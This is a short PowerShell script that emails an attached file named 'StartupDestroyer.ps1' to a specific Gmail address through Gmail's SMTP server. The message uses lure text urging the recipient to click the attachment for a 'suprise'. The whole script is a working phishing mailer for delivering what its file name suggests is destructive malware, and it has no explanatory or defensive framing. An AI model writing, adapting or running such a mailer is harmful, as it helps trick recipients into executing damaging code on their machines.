
$Username = "Anonymous";
$Password = "123456";
$path = "D:\StartupDestroyer.ps1";

function Send-ToEmail([string]$email, [string]$attachmentpath){

    $message = new-object Net.Mail.MailMessage;
    $message.From = "Anonymous@gmail.com";
    $message.To.Add($email);
    $message.Subject = "Click the attached file!";
    $message.Body = "Click the attached file! There is a suprise for you!";
    $attachment = New-Object Net.Mail.Attachment($attachmentpath);
    $message.Attachments.Add($attachment);

    $smtp = new-object Net.Mail.SmtpClient("smtp.gmail.com", "587");
    $smtp.EnableSSL = $true;
    $smtp.Credentials = New-Object System.Net.NetworkCredential($Username, $Password);
    $smtp.send($message);
    write-host "Mail Sent" ; 
    $attachment.Dispose();
 }
Send-ToEmail  -email "theblackvaultufofootage@gmail.com" -attachmentpath $path;